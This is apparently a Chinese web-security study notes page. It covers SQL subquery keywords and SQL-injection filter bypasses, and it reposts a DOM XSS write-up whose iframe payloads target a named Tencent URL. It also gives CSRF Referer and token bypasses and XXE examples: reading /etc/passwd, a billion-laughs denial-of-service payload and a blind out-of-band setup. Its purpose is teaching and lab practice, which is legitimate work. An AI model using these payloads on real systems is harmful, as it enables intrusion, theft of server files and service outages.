<p>假设表t1中有一行包含（10） ， t2包含（20,12,5），则表达式为true；如果t2包含（20,10），或者表t2位空表，则表达式为false。如果t2包含（null，null），则表达式为unkonwn。</p>
<p>all关键词<strong>对于子查询返回的列中的<u>所有值</u>，如果比较结果为true，则返回true</strong><br>例如：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> s1 <span class="keyword">from</span> t1 <span class="keyword">where</span> s1&gt; <span class="keyword">all</span> (<span class="keyword">select</span> s1 <span class="keyword">from</span> s2)</span><br></pre></td></tr></table></figure>

<p>假设表t1中有一行包含（10）。如果表t2包含（-5,0，+5），则表达式为true，因为10比t2中的查出的所有三个值大。如果表t2包含（12,6，null，-100），则表达式为false，因为t2中有一个值12大于10。如果表t2包含（0，null，1），则表达式为unknown。如果t2为空表，则结果为true。</p>
<p>not in 是 “&lt;&gt;all”的别名，用法相同。<br>语句in 与“&#x3D;any”是相同的。<br>例如：</p>
<p><code>select s1 from t1 where s1 = any (select s1 from t2)</code><br><code>select s1 from t1 where s1 in (select s1 from t2)</code></p>
<p>语句some是any的别名，用法相同。<br>例如：</p>
<p><code>select s1 from t1 where s1 &lt;&gt; any (select s1 from t2)</code><br><code>select s1 from t1 where s1 &lt;&gt; some (select s1 from t2)</code></p>
<h3 id="6-mysql-连接函数，-分组连接函数"><a href="#6-mysql-连接函数，-分组连接函数" class="headerlink" title="6.mysql 连接函数， 分组连接函数"></a>6.mysql 连接函数， 分组连接函数</h3><blockquote>
<h5 id="1-concat"><a href="#1-concat" class="headerlink" title="1.concat()"></a>1.concat()</h5><p>concat(str1,str2,…)</p>
<p>若有一个参数为NULL，返回NULL</p>
<h5 id="2-concat-ws"><a href="#2-concat-ws" class="headerlink" title="2.concat_ws()"></a>2.concat_ws()</h5><p>concat_ws(‘间隔符号’,str1,str2,…)</p>
<p><strong>间隔符号可以是空格，不能不写，否则返回为空</strong></p>
<p>显示为str1间隔符号str2间隔符号str3…</p>
<h5 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat"></a>3.group_concat</h5><p>group_concat([distinct] 字段名 [ order by 排序字段 asc&#x2F;desc ] [separator “分隔符”])</p>
<p>多行数据在一行显示函数</p>
<p>根据group by指定的列进行排序分组，将同一组显示出来，并用分隔符间隔</p>
<h5 id="ps-组合使用"><a href="#ps-组合使用" class="headerlink" title="ps. 组合使用"></a>ps. 组合使用</h5><p>如果是多字段组合 显示在一行的eg：</p>
<p>group_concat(concat_ws(‘,’,concat(str1，str2) ) )；</p>
<p>一个字段的话eg：</p>
<p>group_concat(concat_ws(‘,’,str1，str2) )； </p>
</blockquote>
<h3 id="7-过滤替换"><a href="#7-过滤替换" class="headerlink" title="*7.过滤替换"></a>*7.过滤替换</h3><h4 id="1）双写绕过"><a href="#1）双写绕过" class="headerlink" title="1）双写绕过"></a>1）双写绕过</h4><blockquote>
<p>(用于把黑名单的字符替换成空)：se<u>select</u>lect,un<u>union</u>ion，oorr等等（替换为空后，剩余语句就是标准的sql语句，不会影响语句的正常执行）</p>
<p>ps.注意，有的语句命令可能会带有黑名单的字符，也需要双写，如<u>or</u>der,inf<u>or</u>mation.schema_schemata等，当网站在检查时，同样会被替换为空，所以需要写成o<u>or</u>rder,info<u>or</u>rmation.schema_schemata等等</p>
</blockquote>
<h4 id="2）大小写混合"><a href="#2）大小写混合" class="headerlink" title="2）大小写混合"></a>2）大小写混合</h4><blockquote>
<p>(用于黑名单中只有小写或大写，并没有对大小写进行区分)</p>
<p>如sEleCt,unIoN等等</p>
</blockquote>
<h4 id="3）替换"><a href="#3）替换" class="headerlink" title="*3）替换"></a>*3）替换</h4><blockquote>
<p>select：</p>
<p>union：</p>
<p>空格：<code>%0a</code>（分隔符）,<code>%a0</code>，<code>%09</code>(tab), <code>/**/</code>, () 【如select(table_name)from(xxx)】，&lt; &gt;， %20(space),  IFS$9（$IFS是<strong>Unix</strong>系统的一个预设变量表示分隔符，$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串）</p>
<p>&#x3D;：like</p>
<p>and：&amp;&amp;</p>
<p>or：||</p>
<p>#,– : <code>;%00</code></p>
<p>，：用<code>join</code>来代替逗号</p>
</blockquote>
<h4 id="8-注释符"><a href="#8-注释符" class="headerlink" title="8. 注释符"></a>8. 注释符</h4><blockquote>
<p>#、 –+、 –%20、 %23</p>
</blockquote>
<h2 id="二、xss"><a href="#二、xss" class="headerlink" title="二、xss"></a>二、xss</h2><p>把<code>xss-labs</code>做一下就差不多了，后面进阶内容按是需要学习吧</p>
<h3 id="Dom-Xss进阶-善变iframe"><a href="#Dom-Xss进阶-善变iframe" class="headerlink" title="Dom Xss进阶 [善变iframe]"></a>Dom Xss进阶 [善变iframe]</h3><blockquote>
<p>作者：心伤的瘦子</p>
<p>来自：PKAV技术宅社区</p>
<p>网址：<a target="_blank" rel="noopener" href="http://www.pkav.net/">http://www.pkav.net</a></p>
<p>转载于：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/106151313">https://blog.csdn.net/weixin_39934520/article/details/106151313</a></p>
</blockquote>
<p>简要描述：</p>
<blockquote>
<p>有时候，输出还会出现在 </p>
<iframe src="[输出]"></iframe>  

<p>iframe 的 src属性本来应该是一个网址，</p>
<p>但是iframe之善变，使得它同样可以执行javascript，而且可以用不同的姿势来执行。</p>
<p>这一类问题，我将其归为<code>[路径可控]</code>问题。当然上面说到的是普通的反射型XSS。</p>
<p>有时候程序员会使用javascript来动态的改变iframe的src属性，譬如：iframeA.src&#x3D;”[可控的url]”; 同样会导致XSS问题，来看看本例吧</p>
</blockquote>
<p>详细说明：</p>
<blockquote>
<p>1.先来说说iframe的变化。</p>
<p>1.1 最好懂的，onload执行js</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">οnlοad</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.2 src 执行javascript代码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.3 IE下vbscript执行代码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;vbscript:msgbox(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.4 <code>Chrome</code>下<code>data</code>协议执行代码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.5 上面的变体</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.6 <code>Chrome</code>下<code>srcdoc</code>属性</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<ol start="2">
<li><p>有兴趣的，可以一个一个的去测试上面的效果，注意浏览器的特异性哦。</p>
</li>
<li><p>接着我们来看看具体的例子。</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=aaaaaa&amp;gid=yl&amp;cid=68&amp;from=</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>我们先开调试工具，看看有没有可见的输出。</li>
</ol>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803154936817.png"><img src="/Web-study/image-20230803154936817.png" alt="image-20230803154936817"></a></p>
<p>可以看到，我们参数的aaaaaa被带入到了<iframe src="这里"></iframe>。</p>
<p>这样一来，就满足了我们的使用条件。</p>
<p>我们试试</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=javascript:alert(1);<span class="variable">&amp;gid</span>=yl<span class="variable">&amp;cid</span>=68<span class="variable">&amp;from</span>=</span><br></pre></td></tr></table></figure>

<p>。。竟然没反应。我们来看看刚才的那个地方。</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803154959716.png"><img src="/Web-study/image-20230803154959716.png" alt="image-20230803154959716"></a></p>
<p>可以看到，src这次没属性了，看来腾讯做了什么过滤。我们继续搜索下一个toolframe试试。<br>恩，看来就是这段代码导致的。</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803155010542.png"><img src="/Web-study/image-20230803155010542.png" alt="image-20230803155010542"></a></p>
<p>一起看看这段代码。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">OpenFrame</span>(<span class="params">url</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (url.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;http://&#x27;</span>) != <span class="string">&#x27;-1&#x27;</span> || url.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;https://&#x27;</span>) != <span class="string">&#x27;-1&#x27;</span> || url.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;javascript:&#x27;</span>) != <span class="string">&#x27;-1&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;toolframe&quot;</span>).<span class="property">src</span> = url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不难看出，腾讯对 javascript:做出了判断。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;toolframe&quot;).src = url;</span><br></pre></td></tr></table></figure>

<p>这句是导致XSS的一句代码。而openFrame的url参数则来自于(无关代码省略)：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">var</span> tool_url = <span class="title function_">getQueryStringValue</span>(<span class="string">&quot;turl&quot;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="title function_">openFrame</span>(tool_url);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>根据我们上面说道的iframe的利用方法，我们不难看出，腾讯的过滤是不完善的。</li>
</ol>
<p>在IE下，我们可以使用vbscript来执行代码。 vbscript里 ‘ 单引号表示注释，类似JS里的&#x2F;&#x2F;</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://helper.qq.com/appweb/tools/tool-detail.shtml?turl=vbscript:msgbox(<span class="number">1</span>)&#x27;&amp;gid=yl&amp;cid=<span class="number">68</span>&amp;from=</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803155021564.png"><img src="/Web-study/image-20230803155021564.png" alt="image-20230803155021564"></a></p>
<p>在chrome下，我们可以用data协议来执行JS。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=data:text/html,<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;&amp;gid=yl&amp;cid=68&amp;from=</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803155036805.png"><img src="/Web-study/image-20230803155036805.png" alt="image-20230803155036805"></a></p>
<h3 id="漏洞证明："><a href="#漏洞证明：" class="headerlink" title="漏洞证明："></a>漏洞证明：</h3><p>见详细说明</p>
<h3 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h3><blockquote>
<p><code>危险的不光是javascript:，</code></p>
<p><code>vbscript:, data: 等同样需要过滤。</code></p>
</blockquote>
<h2 id="三、csrf"><a href="#三、csrf" class="headerlink" title="三、csrf"></a>三、csrf</h2><h3 id="1）绕过token"><a href="#1）绕过token" class="headerlink" title="1）绕过token"></a>1）绕过token</h3><p>有的时候其实网站根本不验证<code>token</code>，但是在其他方面上它仍然在工作，所以为了绕过它可以考虑抓包删去<code>token</code>，从而正常访问</p>
<h3 id="2）绕过referer"><a href="#2）绕过referer" class="headerlink" title="2）绕过referer"></a>2）绕过referer</h3><h4 id="1-referer条件为空条件时"><a href="#1-referer条件为空条件时" class="headerlink" title="1.referer条件为空条件时"></a>1.referer条件为空条件时</h4><blockquote>
<p>解决方案:</p>
<p>利用<code>ftp://,http://,https://,file://,javascript:,data:</code>这个时候浏览器地址栏是<code>file://</code>开头的，</p>
<p>如果这个HTML页面向任何http站点提交请求的话，这些请求的<code>Referer</code>都是空的。</p>
<p>例:<br><code>1.利用data:协议</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>base64</code>编码 解码即可看到代码</p>
<p><code>2.利用https协议</code><br>https向http跳转的时候Referer为空<br>拿一个https的webshell</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;https://xxxxx.xxxxx/attack.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>attack.php写上CSRF攻击代码</p>
</blockquote>
<h4 id="2-判断Referer是某域情况下绕过"><a href="#2-判断Referer是某域情况下绕过" class="headerlink" title="2.判断Referer是某域情况下绕过"></a>2.判断Referer是某域情况下绕过</h4><blockquote>
<p>比如你找的csrf是<a href="https://link.zhihu.com/?target=http://xxx.com">http://xxx.com</a> </p>
<p>验证的referer是验证的*.<a href="https://link.zhihu.com/?target=http://xx.com">http://xx.com</a> </p>
<p>可以找个二级域名 之后&lt;img “csrf地址”&gt; 之后在把文章地址发出去 就可以伪造。</p>
</blockquote>
<h4 id="3-判断referer是否存在某关键字"><a href="#3-判断referer是否存在某关键字" class="headerlink" title="3.判断referer是否存在某关键字"></a>3.判断referer是否存在某关键字</h4><blockquote>
<p>referer判断存在不存在<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>这个关键词</p>
<p>在网站新建一个<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>目录 把CSRF存放在<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>目录,即可绕过</p>
</blockquote>
<h4 id="4-判断Referer是否含有某域名"><a href="#4-判断Referer是否含有某域名" class="headerlink" title="4.判断Referer是否含有某域名"></a>4.判断Referer是否含有某域名</h4><blockquote>
<p>判断了Referer开头是否以<a href="https://link.zhihu.com/?target=http://126.com">http://126.com</a>以及126子域名 不验证根域名为<a href="https://link.zhihu.com/?target=http://126.com">http://126.com</a> 那么我这里可以构造子域名<a href="https://link.zhihu.com/?target=http://x.126.com.xxx.com">http://x.126.com.xxx.com</a>作为蠕虫传播的载体服务器，即可绕过。</p>
</blockquote>
<h3 id="3）不同浏览器的区别"><a href="#3）不同浏览器的区别" class="headerlink" title="3）不同浏览器的区别"></a>3）不同浏览器的区别</h3><p> 在满足上述前后端条件后，浏览器在完成预检请求后会自动携带上Cookie字段，但是由于浏览器的内核特性不同，此时又出现了不同的情况</p>
<blockquote>
<p>  <code>Firefox</code>携带网站A的Cookie值发起POST请求<br>  <code>Edge</code>没有携带网站A的Cookie值发起POST请求<br>  <code>Chrome</code>没有携带网站A的Cookie值发起POST请求</p>
</blockquote>
<h2 id="四、xxe"><a href="#四、xxe" class="headerlink" title="四、xxe"></a>四、xxe</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ec2888780308">推荐学习文章</a></p>
</blockquote>
<h3 id="必须在文档类型定义-DTD-中创建实体"><a href="#必须在文档类型定义-DTD-中创建实体" class="headerlink" title="必须在文档类型定义 (DTD) 中创建实体"></a>必须在文档类型定义 (DTD) 中创建实体</h3><p><a data-fancybox="gallery" data-src="/Web-study/image-20221015095141092.png"><img src="/Web-study/image-20221015095141092.png" alt="image-20221015095141092"></a></p>
<p>正如您所看到的，一旦 XML 文档被解析器处理，它将<code>js</code>用定义的常量<code>“Jo Smith”</code>替换定义的实体。如您所见，这有很多优点，因为您可以<code>js</code>在一个地方更改为例如<code>“John Smith”</code>。</p>
<p>在 <code>Java</code> 应用程序中，<code>XML</code> 可用于从客户端获取数据到服务器，我们都熟悉 <code>JSON api</code>，我们也可以使用 <code>xml</code> 来获取信息。大多数情况下，框架会根据 <code>xml</code> 结构自动填充 <code>Java</code> 对象，例如：</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20221015095555062.png"><img src="/Web-study/image-20221015095555062.png" alt="image-20221015095555062"></a></p>
<blockquote>
<p>PCDATA:<br>它是XML解析器解析的文本数据使用的一个术语。XML 文档中的文本通常解析为字符数据，或者（按照文档类型定义术语）称为 PCDATA。</p>
<p>XML 的特殊字符（&amp;、&lt; 和 &gt;）在 PCDATA 中可以识别，并用于解析元素名称和实体。PCDATA（字符数据）区域被解析器视为数据块，从而允许您在数据流中包含任意字符。</p>
</blockquote>
<p>如果 XML 解析器配置为<strong>允许外部 DTD 或实体</strong>，我们可以使用以下内容更改以下 XML 片段：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">author</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">js</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;js;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在会发生什么？我们从本地文件系统中定义了一个包含，<code>XML</code> 解析器将加载该文件，并将在引用实体的任何位置添加内容。假设 XML 消息返回给用户，消息将是：</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20221015094930498.png"><img src="/Web-study/image-20221015094930498.png" alt="image-20221015094930498"></a></p>
<hr>
<h3 id="XXE-DOS攻击"><a href="#XXE-DOS攻击" class="headerlink" title="XXE DOS攻击"></a>XXE DOS攻击</h3><p>同XXE攻击我们可以执行一个DOS服务攻击对服务器。 一个例子的攻击是： </p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;?xml version=&quot;<span class="number">1.0</span>&quot;?&gt;</span></span><br><span class="line"><span class="params">&lt;!DOCTYPE lolz [</span></span><br><span class="line"><span class="params"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ELEMENT lolz (#PCDATA)&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol1 &quot;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol2 &quot;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol3 &quot;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol4 &quot;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol5 &quot;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol6 &quot;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol7 &quot;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol8 &quot;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol9 &quot;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;&quot;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="params">&lt;lolz&gt;</span><span class="variable">&amp;lol9</span><span class="punctuation">;</span><span class="params">&lt;/lolz&gt;</span></span><br></pre></td></tr></table></figure>

<p>当<code>XML  parser</code>载这个文件，它认为，它包括一个根本的元素，”<code>lolz</code>“，包含的文本”<code>&amp;lol9</code>;”.  然而，”<code>&amp;lol9</code>;”是一个已定义的实体，扩展为一个包含十个”&lol8;”串。  每个”<code>&amp;lol8</code>;”串是一个已定义的实体，扩展到十”<code>&amp;lol7</code>;”串，等等。  </p>
<p>在所有的实体扩张，已经进行处理，<strong>这一小型(&lt;1KB)的框XML实际上会采取了几乎3千兆字节的存储器。</strong> </p>
<h3 id="盲注XXE"><a href="#盲注XXE" class="headerlink" title="盲注XXE"></a>盲注XXE</h3><p>在许多情况下，攻击者可以将 <code>XXE</code> <code>payload</code>发送到 <code>Web</code> 应用程序，但<strong>永远不会返回响应</strong>，这被称为带外漏洞（<code>Out-of-band</code>）</p>
<p>利用此类漏洞的过程需要利用参数实体，使攻击者让 <code>XML</code> 解析器向攻击者</p>
<p><strong>控制的服务器发出额外的请求，以便读取文件的内容</strong></p>
<p>作为一个攻击者你有<code>WebWolf</code>在你的控制( <strong>这可以是任何服务器你的控制之下.</strong> ), 例如，可以使用这个服务器平使用  <code>http://127.0.0.1:9090/home</code></p>
<p>我们如何使用这些终端检验我们是否可以执行<code>XXE</code>? </p>
<p>我们可以再次使用WebWolf举办一个文件叫  <code>attack.dtd</code> 创建这一文件与以下内容： </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">ping</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;&lt;a href=&quot;http://127.0.0.1:9090/landing&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;a href=&quot;http://127.0.0.1:9090/landing&quot; class=&quot;bare&quot;&gt;http://127.0.0.1:9090/landing&lt;/a&gt;&lt;/a&gt;&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在提交形式的改变使用<code>xml</code>： </p>
<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;webWolfLink:[webWolfLink]&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%remote;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">text</span>&gt;</span>test<span class="symbol">&amp;ping;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

